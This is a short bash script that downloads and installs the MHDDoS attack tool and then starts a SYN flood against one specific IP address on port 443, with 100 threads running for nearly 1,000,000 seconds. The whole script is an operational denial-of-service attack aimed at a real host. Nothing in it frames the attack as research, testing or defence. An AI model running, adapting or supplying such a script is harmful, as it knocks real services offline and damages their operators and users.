#!/bin/bash
git clone https://github.com/MatrixTM/MHDDoS.git
curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py
sudo python3 get-pip.py
cd MHDDoS/
pip install -r requirements.txt
python3 start.py syn 85.121.242.24:443 100 999999
